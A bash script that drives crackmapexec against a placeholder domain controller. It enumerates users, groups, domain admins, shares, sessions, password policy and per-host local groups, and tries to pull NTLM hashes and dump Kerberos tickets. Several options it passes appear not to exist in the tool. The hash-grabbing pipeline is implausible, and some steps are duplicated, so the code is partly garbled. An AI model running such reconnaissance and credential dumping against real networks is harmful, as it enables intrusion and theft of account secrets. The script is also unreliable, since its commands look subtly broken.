#!/bin/bash

# Set the target domain and domain controller
DOMAIN="example.com"
DC="dc.example.com"

# Set the username and password for the enumeration
USER="user"
PASSWORD="password"

# Parse command line arguments
while getopts ":N" opt; do
  case $opt in
    N)
      NO_PASS=true
      PASSWORD=""
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
  esac
done

# Get the user's Kerberos hash
HASH=$(crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") | grep 'HASH.*NTLM' | awk '{print $3}')

# Enumerate users
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --users > users.txt

# Enumerate groups
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --groups > groups.txt

# Enumerate domain admins
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --groups | grep -i 'domain admins' | awk '{print $1}' > domain_admins.txt

# Enumerate computers
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --no-bruteforce --no-registry --no-wmi --no-mssql --no-snmp --no-winrm -oG computers.gnmap

# Enumerate shares
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --shares > shares.txt

# Enumerate domain users with password policy information
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --users --pass-pol > users_with_password_policy_info.txt

# Enumerate Kerberos tickets
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --kerberos > kerberos_tickets.txt

# Dump Kerberos tickets
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --krb5tgs > tickets.kirbi

# Enumerate computers
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --ping > computers.txt

# Enumerate shares
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --shares > shares.txt

# Enumerate open SMB sessions
crackmapexec smb $DC -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --sessions > sessions.txt

# Enumerate local groups on each computer
for computer in $(cat computers.txt); do
    crackmapexec smb $computer -u $USER -p $PASSWORD $([[ $NO_PASS ]] && echo "--no-pass") --local-groups > "local_groups_$computer.txt"
done
